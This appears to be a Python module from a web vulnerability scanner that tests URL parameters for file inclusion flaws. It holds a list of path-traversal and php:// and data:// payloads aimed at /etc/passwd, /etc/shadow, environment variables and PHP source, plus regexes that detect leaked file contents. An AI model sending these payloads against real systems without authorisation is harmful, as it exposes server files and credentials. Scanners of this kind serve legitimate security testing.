from modules.base import BaseModule
from modules.evidence import context_excerpt, new_regex_evidence


class LfiModule(BaseModule):
    NAME = "lfi"
    DESCRIPTION = "LFI/RFI testing - path traversal, php:// wrappers"

    LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "../../../../windows/system32/drivers/etc/hosts",
        "../../../../proc/self/environ",
        "../../../../var/log/apache2/access.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "/etc/passwd",
        "/etc/shadow",
    ]

    SUCCESS_PATTERNS = [
        r"(?m)^root:[^\r\n]*:0:0:[^\r\n]*$",
        r"(?m)^daemon:[^\r\n]*:[0-9]+:[0-9]+:[^\r\n]*$",
        r"\[PHP\]",
        r"DOCUMENT_ROOT",
        r"<?php",
    ]

    PARAMS = ["file", "page", "path", "include", "load", "template",
              "view", "doc", "document", "dir", "show", "read"]

    def run(self):
        self.log.info("[lfi] Testing for file inclusion vulnerabilities")
        for param in self.PARAMS:
            baseline = self.get(self.target, params={param: "vulxor_file_baseline"})
            if not baseline:
                continue
            for payload in self.LFI_PAYLOADS:
                resp = self.get(self.target, params={param: payload})
                evidence = new_regex_evidence(
                    baseline.text,
                    resp.text if resp else "",
                    self.SUCCESS_PATTERNS,
                )
                if evidence:
                    self.add_finding(
                        severity="CRITICAL",
                        title="Local File Inclusion",
                        url=self.target,
                        detail=f"Parameter '{param}' discloses server files.",
                        payload=payload,
                        evidence=context_excerpt(resp.text, evidence),
                        remediation=(
                            "Never pass user input to filesystem functions. "
                            "Use an allowlist of permitted files."
                        ),
                    )
                    return
